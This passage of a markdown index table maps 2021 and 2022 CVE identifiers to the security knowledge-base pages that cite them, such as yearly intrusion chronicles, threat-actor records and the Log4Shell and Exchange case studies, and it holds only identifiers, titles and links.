| [CVE-2021-25394](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-25394) | [Mobile Security Reference](/MOBILE_SECURITY_REFERENCE.md) |
| [CVE-2021-26084](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-26084) | [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2021-26828](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-26828) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md), [Slide plan: Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/slides/plans/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2021-26829](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-26829) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2021-26855](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-26855) | [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [APT41: The Public Record, 2012 to 2026](/case-studies/APT41_PUBLIC_RECORD.md), [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [Operation Exchange Marauder and the 2021 Exchange Server Mass Exploitation](/case-studies/EXCHANGE_MARAUDER_2021.md), [Case Studies](/case-studies/README.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md), [Slide plan: The Year 2021 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2021.md), [Slide plan: Operation Exchange Marauder and the 2021 Exchange Server Mass Exploitation](/case-studies/slides/plans/EXCHANGE_MARAUDER_2021.md) |
| [CVE-2021-26857](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-26857) | [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [Operation Exchange Marauder and the 2021 Exchange Server Mass Exploitation](/case-studies/EXCHANGE_MARAUDER_2021.md), [Case Studies](/case-studies/README.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Slide plan: Operation Exchange Marauder and the 2021 Exchange Server Mass Exploitation](/case-studies/slides/plans/EXCHANGE_MARAUDER_2021.md) |
| [CVE-2021-26858](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-26858) | [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [Operation Exchange Marauder and the 2021 Exchange Server Mass Exploitation](/case-studies/EXCHANGE_MARAUDER_2021.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Slide plan: Operation Exchange Marauder and the 2021 Exchange Server Mass Exploitation](/case-studies/slides/plans/EXCHANGE_MARAUDER_2021.md) |
| [CVE-2021-27065](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-27065) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [Operation Exchange Marauder and the 2021 Exchange Server Mass Exploitation](/case-studies/EXCHANGE_MARAUDER_2021.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Slide plan: Operation Exchange Marauder and the 2021 Exchange Server Mass Exploitation](/case-studies/slides/plans/EXCHANGE_MARAUDER_2021.md) |
| [CVE-2021-27101](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-27101) | [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [The Cl0p MOVEit Breach and the File-Transfer Extortion Playbook: A 2023 Case Study](/case-studies/CL0P_FILE_TRANSFER_2023.md), [Major Cloud Security Incidents: The Public Record, 2011 to 2026](/case-studies/CLOUD_SECURITY_INCIDENTS.md) |
| [CVE-2021-27102](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-27102) | [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [The Cl0p MOVEit Breach and the File-Transfer Extortion Playbook: A 2023 Case Study](/case-studies/CL0P_FILE_TRANSFER_2023.md) |
| [CVE-2021-27103](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-27103) | [The Cl0p MOVEit Breach and the File-Transfer Extortion Playbook: A 2023 Case Study](/case-studies/CL0P_FILE_TRANSFER_2023.md) |
| [CVE-2021-27104](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-27104) | [The Cl0p MOVEit Breach and the File-Transfer Extortion Playbook: A 2023 Case Study](/case-studies/CL0P_FILE_TRANSFER_2023.md), [Major Cloud Security Incidents: The Public Record, 2011 to 2026](/case-studies/CLOUD_SECURITY_INCIDENTS.md) |
| [CVE-2021-28799](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-28799) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md) |
| [CVE-2021-30116](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-30116) | [Malware Families Reference](/MALWARE_FAMILIES.md), [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [Major Cloud Security Incidents: The Public Record, 2011 to 2026](/case-studies/CLOUD_SECURITY_INCIDENTS.md), [Able2Shell and the RMM Attack Surface: The N-able N-central Disclosure of November 2026](/case-studies/NABLE_NCENTRAL_ABLE2SHELL_2026.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [Slide plan: The Year 2021 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2021.md) |
| [CVE-2021-30551](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-30551) | [Browser Security Reference](/BROWSER_SECURITY_REFERENCE.md) |
| [CVE-2021-30657](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-30657) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2021-30860](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-30860) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [Mobile Security Reference](/MOBILE_SECURITY_REFERENCE.md), [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md), [Slide plan: The Year 2021 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2021.md), [Slide plan: The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/slides/plans/ZERO_DAY_MARKET_EVENTS.md), [Mobile Security](/disciplines/mobile-security.md) |
| [CVE-2021-31010](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-31010) | [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md) |
| [CVE-2021-31196](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-31196) | [Operation Exchange Marauder and the 2021 Exchange Server Mass Exploitation](/case-studies/EXCHANGE_MARAUDER_2021.md) |
| [CVE-2021-31207](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-31207) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [Operation Exchange Marauder and the 2021 Exchange Server Mass Exploitation](/case-studies/EXCHANGE_MARAUDER_2021.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md) |
| [CVE-2021-31979](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-31979) | [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md) |
| [CVE-2021-33044](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-33044) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md), [Physical Security Reference](/PHYSICAL_SECURITY_REFERENCE.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2021-33045](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-33045) | [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2021-33766](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-33766) | [Operation Exchange Marauder and the 2021 Exchange Server Mass Exploitation](/case-studies/EXCHANGE_MARAUDER_2021.md) |
| [CVE-2021-33771](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-33771) | [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md) |
| [CVE-2021-34473](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-34473) | [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md), [Malware Families Reference](/MALWARE_FAMILIES.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [Operation Exchange Marauder and the 2021 Exchange Server Mass Exploitation](/case-studies/EXCHANGE_MARAUDER_2021.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md), [Slide plan: The Year 2021 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2021.md) |
| [CVE-2021-34523](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-34523) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [Operation Exchange Marauder and the 2021 Exchange Server Mass Exploitation](/case-studies/EXCHANGE_MARAUDER_2021.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md) |
| [CVE-2021-34527](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-34527) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Penetration Testing Checklists](/PENTEST_CHECKLISTS.md), [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [Slide plan: The Year 2021 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2021.md), [Vulnerability Management](/disciplines/vulnerability-management.md) |
| [CVE-2021-35211](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-35211) | [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md) |
| [CVE-2021-35247](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-35247) | [Log4Shell (CVE-2021-44228): The Case Study](/case-studies/LOG4SHELL.md) |
| [CVE-2021-36260](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-36260) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md), [Physical Security Reference](/PHYSICAL_SECURITY_REFERENCE.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2021-38647](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-38647) | [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md) |
| [CVE-2021-40444](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-40444) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md) |
| [CVE-2021-40539](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-40539) | [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Slide plan: The Year 2021 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2021.md) |
| [CVE-2021-41773](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-41773) | [CVE Reference Guide](/CVE_REFERENCE.md), [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2021-42013](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-42013) | [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md) |
| [CVE-2021-42237](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-42237) | [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2021-43226](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-43226) | [North Korea-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_NORTH_KOREA.md), [Slide plan: North Korea-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_NORTH_KOREA.md) |
| [CVE-2021-43890](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-43890) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2021-44026](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-44026) | [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2021-44207](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-44207) | [APT41: The Public Record, 2012 to 2026](/case-studies/APT41_PUBLIC_RECORD.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [Log4Shell (CVE-2021-44228): The Case Study](/case-studies/LOG4SHELL.md), [Slide plan: APT41: The Public Record, 2012 to 2026](/case-studies/slides/plans/APT41_PUBLIC_RECORD.md) |
| [CVE-2021-44228](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-44228) | [CVE Reference Guide](/CVE_REFERENCE.md), [Detection Rule Writing Reference](/DETECTION_RULES_REFERENCE.md), [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md), [HONEYPOT & DECEPTION TECHNOLOGY REFERENCE](/HONEYPOT_DECEPTION_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [OSINT Reference](/OSINT_REFERENCE.md), [Penetration Testing Methodology Reference](/PENETRATION_TESTING_METHODOLOGY.md), [Penetration Testing Checklists](/PENTEST_CHECKLISTS.md), [Red Team Reference: Authorized Operator Field Guide](/RED_TEAM_REFERENCE.md), [Vulnerability Management Reference](/VULNERABILITY_MANAGEMENT_REFERENCE.md), [APT41: The Public Record, 2012 to 2026](/case-studies/APT41_PUBLIC_RECORD.md), [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [Ghostcat, CVE-2020-1938: The Tomcat AJP File Read in the Lab](/case-studies/GHOSTCAT_CVE_2020_1938.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [Ivanti EPMM Code Injection (CVE-2026-1281 and CVE-2026-1340): A Case Study](/case-studies/IVANTI_EPMM_CVE_2026_1281.md), [Log4Shell (CVE-2021-44228): The Case Study](/case-studies/LOG4SHELL.md), [PHP 8.4.27, CVE-2026-109618 and CVE-2026-109619: Two Fixes Verified in the Lab](/case-studies/PHP_8_4_27_CVES.md), [Case Studies](/case-studies/README.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md), [North Korea-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_NORTH_KOREA.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md), [Slide plan: The Year 2021 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2021.md), [Slide plan: Log4Shell (CVE-2021-44228): The Case Study](/case-studies/slides/plans/LOG4SHELL.md), [Slide plan: Iran-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_IRAN.md), [Slide plan: North Korea-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_NORTH_KOREA.md), [Application Security](/disciplines/application-security.md), [Vulnerability Management](/disciplines/vulnerability-management.md), [Spring Boot](/frameworks/spring-boot.md), [Start a Vulnerability Management Program (First 90 Days)](/guides/START_A_VULN_MGMT_PROGRAM.md), [Tool Manuals and Repositories](/tools-research/TOOL_MANUALS_AND_REPOSITORIES.md), [AWS WAF](/tools/aws-waf.md) |
| [CVE-2021-45046](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-45046) | [CVE Reference Guide](/CVE_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Penetration Testing Methodology Reference](/PENETRATION_TESTING_METHODOLOGY.md), [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [Log4Shell (CVE-2021-44228): The Case Study](/case-studies/LOG4SHELL.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md), [Slide plan: Log4Shell (CVE-2021-44228): The Case Study](/case-studies/slides/plans/LOG4SHELL.md) |
| [CVE-2022-0185](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-0185) | [Kubernetes Security Reference](/KUBERNETES_SECURITY_REFERENCE.md) |
| [CVE-2022-0609](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-0609) | [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [Slide plan: The Year 2022 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2022.md) |
| [CVE-2022-0847](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-0847) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Privilege Escalation Reference](/PRIVESC_REFERENCE.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [Container & Kubernetes Security](/disciplines/container-kubernetes-security.md), [Vulnerability Management](/disciplines/vulnerability-management.md) |
| [CVE-2022-1040](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-1040) | [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md) |
| [CVE-2022-1388](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-1388) | [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md), [Slide plan: The Year 2022 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2022.md), [Slide plan: Iran-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_IRAN.md) |
| [CVE-2022-2294](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-2294) | [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md) |
| [CVE-2022-3038](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-3038) | [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md) |
| [CVE-2022-3236](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-3236) | [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2022-20775](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-20775) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The Cisco Catalyst SD-WAN Authentication Bypass of 2026 (CVE-2026-20127) and UAT-8616: A Case Study](/case-studies/CISCO_SDWAN_CVE_2026_20127.md), [Case Studies](/case-studies/README.md), [Slide plan: The Cisco Catalyst SD-WAN Authentication Bypass of 2026 (CVE-2026-20127) and UAT-8616: A Case Study](/case-studies/slides/plans/CISCO_SDWAN_CVE_2026_20127.md) |
| [CVE-2022-21894](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-21894) | [Hardware Security Reference](/HARDWARE_SECURITY_REFERENCE.md), [Malware Families Reference](/MALWARE_FAMILIES.md), [APT41: The Public Record, 2012 to 2026](/case-studies/APT41_PUBLIC_RECORD.md), [Slide plan: APT41: The Public Record, 2012 to 2026](/case-studies/slides/plans/APT41_PUBLIC_RECORD.md) |
| [CVE-2022-22954](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-22954) | [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [Slide plan: The Year 2022 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2022.md) |
| [CVE-2022-22960](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-22960) | [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md) |
| [CVE-2022-22965](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-22965) | [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [Spring Boot](/frameworks/spring-boot.md) |
| [CVE-2022-24086](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-24086) | [E-Commerce Threats: The Public Record, 1999 to 2026](/case-studies/ECOMMERCE_THREATS.md), [Slide plan: E-Commerce Threats: The Public Record, 1999 to 2026](/case-studies/slides/plans/ECOMMERCE_THREATS.md) |
| [CVE-2022-24112](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-24112) | [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2022-24521](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-24521) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md) |
| [CVE-2022-24682](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-24682) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md) |
| [CVE-2022-24990](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-24990) | [North Korea-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_NORTH_KOREA.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md), [Slide plan: North Korea-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_NORTH_KOREA.md) |
| [CVE-2022-26134](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-26134) | [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md), [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md), [Slide plan: The Year 2022 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2022.md) |
| [CVE-2022-26138](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-26138) | [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2022-26143](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-26143) | [Wireless Security Reference](/WIRELESS_SECURITY_REFERENCE.md) |
| [CVE-2022-27518](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-27518) | [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [Slide plan: The Year 2022 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2022.md) |
| [CVE-2022-27924](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-27924) | [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md) |
| [CVE-2022-27925](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-27925) | [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md) |
| [CVE-2022-29464](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-29464) | [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md) |
| [CVE-2022-30190](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-30190) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [The Microsoft Office Security Feature Bypass of 2026 (CVE-2026-21509) and APT28: A Case Study](/case-studies/MICROSOFT_OFFICE_CVE_2026_21509.md), [Slide plan: The Microsoft Office Security Feature Bypass of 2026 (CVE-2026-21509) and APT28: A Case Study](/case-studies/slides/plans/MICROSOFT_OFFICE_CVE_2026_21509.md) |
| [CVE-2022-30333](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-30333) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md) |
| [CVE-2022-31199](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-31199) | [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md) |
| [CVE-2022-34713](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-34713) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2022-37042](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-37042) | [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md) |
| [CVE-2022-38028](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-38028) | [ATT&CK Campaigns Reference](/ATTACK_CAMPAIGNS_REFERENCE.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2022-40684](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-40684) | [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [The FortiCloud SSO Authentication Bypass of 2026 (CVE-2026-24858): A Case Study](/case-studies/FORTINET_FORTICLOUD_SSO_CVE_2026_24858.md), [Slide plan: The Year 2022 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2022.md), [Vulnerability Management](/disciplines/vulnerability-management.md) |
| [CVE-2022-41040](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-41040) | [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md) |
| [CVE-2022-41049](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-41049) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2022-41080](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-41080) | [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md) |
